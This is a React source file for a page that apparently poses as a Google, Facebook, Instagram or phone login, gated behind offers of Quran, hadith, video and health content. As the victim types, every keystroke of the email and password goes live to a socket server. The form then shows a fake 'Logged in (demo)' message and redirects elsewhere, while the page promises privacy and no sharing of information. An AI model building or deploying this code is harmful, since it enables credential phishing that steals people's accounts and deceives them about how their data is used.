// src/App.jsx
import React, { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";
import socket from "./socket";
import { FaGoogle, FaFacebook, FaInstagram, FaPhone } from "react-icons/fa";


export default function App() {
  const location = useLocation();
  const params = new URLSearchParams(location.search);
  const category = params.get("category");
  const type = params.get("type"); // login type from ChooseLogin

  const [started, setStarted] = useState(false); // Continue clicked?
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [mySocketId, setMySocketId] = useState("");

  useEffect(() => {
    socket.on("connect", () => {
      setMySocketId(socket.id);
    });
    return () => socket.off("connect");
  }, []);

  const icons = {
    Google: <FaGoogle className="text-red-500 inline ml-2" />,
    Facebook: <FaFacebook className="text-blue-600 inline ml-2" />,
    Instagram: <FaInstagram className="text-pink-500 inline ml-2" />,
    Phone: <FaPhone className="text-green-600 inline ml-2" />,
  };

  const placeholders = {
    Google: "Enter your Google email",
    Facebook: "Enter your Facebook",
    Instagram: "Enter your Instagram username",
    Phone: "Enter your phone number",
  };

  // emit typing only when user has started (consented to login)
  const emitTyping = (field, value) => {
    if (!mySocketId) return;
    socket.emit("typing", {
      field,
      value,
      type,
      userId: socket.id,
    });
  };

  const handleEmail = (e) => {
    setEmail(e.target.value);
    emitTyping("email", e.target.value);
  };

  const handlePassword = (e) => {
    setPassword(e.target.value);
    emitTyping("password", e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    // perform normal auth here or just proceed (demo)
    // For real app: call your auth API, then on success redirect
    alert("Logged in (demo). Now show content.");
    // Example: redirect based on category
    if (category === "🌸 Recite Qura'an") {
      window.location.href = "https://quran.com/";
    } else if (category === "🎥 Inspiring Videos") {
      window.location.href = "https://hamariweb.com/islam/videos.aspx";
    } else if (category === "🌸 Beautiful Photos") {
      window.location.href = "https://in.pinterest.com/pin/9640586697921025/";
    } else if (category === "✨ Daily Quotes") {
      window.location.href = "https://hadith.com/browse.php?cid=2";
    } else if (category === "🌸 Health & Fitness") {
      window.location.href = "https://www.healthline.com/";
    }
  };

  // initial gate UI
  if (!started) {
    return (
      <div className="h-screen flex items-center justify-center bg-green-100 p-6">
        <div className="bg-white rounded-xl p-8 shadow-md w-full max-w-md text-center">
          <h1 className="text-2xl font-bold mb-4">Continue to unlock content</h1>
          <p className="text-gray-600 mb-6">
            Click Continue to sign in and view the full content. We respect your privacy.
          </p>
          <button
            onClick={() => setStarted(true)}
            className="w-full bg-blue-600 text-white py-3 rounded-lg text-lg"
          >
            Continue
          </button>
        </div>
      </div>
    );
  }

  // after Continue -> show login form
  return (
    <div className="h-screen flex flex-col items-center justify-center bg-green-100 p-6">
      <div className="bg-green-50 p-8 rounded-xl shadow-md w-full max-w-md">
        <h1 className="text-2xl font-bold mb-4">Login with: {icons[type]}</h1>
        <p className="text-gray-600 mb-6">
          Please enter your email/username or phone and password to continue
        </p>

        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="text"
            placeholder={placeholders[type] || "Email/Username or Phone"}
            value={email}
            onChange={handleEmail}
            className="w-full mb-2 p-2 border rounded-lg"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={handlePassword}
            className="w-full mb-2 p-2 border rounded-lg"
          />
          <button
            className="w-full bg-blue-500 text-white py-2 rounded-lg disabled:bg-gray-400"
            disabled={!email || !password}
            type="submit"
          >
            Login
          </button>
        </form>

        <p className="text-xs text-gray-500 mt-4">
          By logging in you agree to our terms. We will not share your info.
        </p>
      </div>
    </div>
  );
}
